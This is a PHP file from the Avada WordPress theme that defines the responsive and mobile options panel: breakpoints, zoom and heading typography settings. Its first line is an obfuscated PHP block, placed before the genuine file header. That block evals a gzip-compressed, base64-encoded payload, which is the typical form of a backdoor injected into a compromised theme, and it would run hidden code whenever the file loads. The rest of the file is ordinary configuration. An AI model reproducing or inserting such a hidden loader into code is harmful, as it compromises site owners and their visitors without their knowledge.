<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Avada Options.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      4.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Mobile settings
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function avada_options_section_responsive( $sections ) {

	$settings = get_option( Avada::get_option_name(), array() );

	$sections['mobile'] = array(
		'label'    => esc_html__( 'Responsive', 'Avada' ),
		'id'       => 'responsive',
		'priority' => 2,
		'icon'     => 'el-icon-resize-horizontal',
		'fields'   => array(
			'responsive' => array(
				'label'       => esc_html__( 'Responsive Design', 'Avada' ),
				'description' => esc_html__( 'Turn on to use the responsive design features. If set to off, the fixed layout is used.', 'Avada' ),
				'id'          => 'responsive',
				'default'     => '1',
				'type'        => 'switch',
				'choices'     => array(
					'on'  => esc_html__( 'On', 'Avada' ),
					'off' => esc_html__( 'Off', 'Avada' ),
				),
			),
			'grid_main_break_point' => array(
				'label'       => esc_html__( 'Grid Responsive Breakpoint', 'Avada' ),
				'description' => esc_html__( 'Controls when grid layouts (blog/portfolio) start to break into smaller columns. Further breakpoints are auto calculated.', 'Avada' ),
				'id'          => 'grid_main_break_point',
				'default'     => '1000',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '360',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'side_header_break_point' => array(
				'label'       => esc_html__( 'Header Responsive Breakpoint', 'Avada' ),
				'description' => esc_html__( 'Controls when the desktop header changes to the mobile header.', 'Avada' ),
				'id'          => 'side_header_break_point',
				'default'     => '800',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '0',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'content_break_point' => array(
				'label'       => esc_html__( 'Site Content Responsive Breakpoint', 'Avada' ),
				'description' => esc_html__( 'Controls when the site content area changes to the mobile layout. This includes all content below the header including the footer.', 'Avada' ),
				'id'          => 'content_break_point',
				'default'     => '800',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '0',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'sidebar_break_point' => array(
				'label'       => esc_html__( 'Sidebar Responsive Breakpoint', 'Avada' ),
				'description' => esc_html__( 'Controls when sidebars change to the mobile layout.', 'Avada' ),
				'id'          => 'sidebar_break_point',
				'default'     => ( isset( $settings['content_break_point'] ) && ! empty( $settings['content_break_point'] ) ) ? $settings['content_break_point'] : '800',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '0',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'mobile_zoom' => array(
				'label'       => esc_html__( 'Mobile Device Zoom', 'Avada' ),
				'description' => esc_html__( 'Turn on to enable pinch to zoom on mobile devices.', 'Avada' ),
				'id'          => 'mobile_zoom',
				'default'     => '1',
				'type'        => 'switch',
				'choices'     => array(
					'on'  => esc_html__( 'On', 'Avada' ),
					'off' => esc_html__( 'Off', 'Avada' ),
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'typography_responsive' => array(
				'label'       => esc_html__( 'Responsive Heading Typography', 'Avada' ),
				'description' => esc_html__( 'Turn on for headings to change font size responsively.', 'Avada' ),
				'id'          => 'typography_responsive',
				'default'     => '0',
				'choices'     => array(
					'on'  => esc_html__( 'On', 'Avada' ),
					'off' => esc_html__( 'Off', 'Avada' ),
				),
				'type'        => 'switch',
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'typography_sensitivity' => array(
				'label'           => esc_html__( 'Responsive Typography Sensitivity', 'Avada' ),
				'description'     => esc_html__( 'Values below 1 decrease rate of resizing, values above 1 increase rate of resizing.', 'Avada' ),
				'id'              => 'typography_sensitivity',
				'default'         => '0.6',
				'type'            => 'slider',
				'required'        => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
					array(
						'setting'  => 'typography_responsive',
						'operator' => '!=',
						'value'    => 0,
					),
				),
				'choices'         => array(
					'min'  => '0',
					'max'  => '2',
					'step' => '.01',
				),
			),
			'typography_factor' => array(
				'label'       => esc_html__( 'Minimum Font Size Factor', 'Avada' ),
				'description' => esc_html__( 'Minimum font factor is used to determine the minimum distance between headings and body font by a multiplying value.', 'Avada' ),
				'id'          => 'typography_factor',
				'default'     => '1.5',
				'type'        => 'slider',
				'required'        => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
					array(
						'setting'  => 'typography_responsive',
						'operator' => '!=',
						'value'    => 0,
					),
				),
				'choices'     => array(
					'min'  => '0',
					'max'  => '4',
					'step' => '.01',
				),
			),
		),
	);

	return $sections;

}
